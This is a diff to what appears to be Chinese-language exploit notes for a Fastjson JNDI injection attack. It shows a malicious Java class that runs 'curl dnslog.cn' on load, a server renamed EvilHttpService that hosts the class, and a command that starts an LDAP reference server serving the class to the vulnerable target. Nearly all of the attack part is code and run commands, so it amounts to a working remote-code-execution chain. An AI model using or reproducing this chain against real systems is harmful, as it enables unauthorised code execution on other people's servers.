@@ -57,12 +57,14 @@ public class Object {
         Runtime.getRuntime().exec("curl dnslog.cn");
    }
 }
+javac Object.java
+
 启动http服务器
 import java.io.*;
 import java.net.*;
 import com.sun.net.httpserver.*;
 
-public class RMIService {
+public class EvilHttpService {
     public static void main(String[] args) {
         try {
             String serverAddress = args[0];
@@ -79,6 +81,9 @@ public class RMIService {
         }
     }
 }
+
+java EvilHttpService ip port
+
 启动ldap服务，从http服务获取class
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
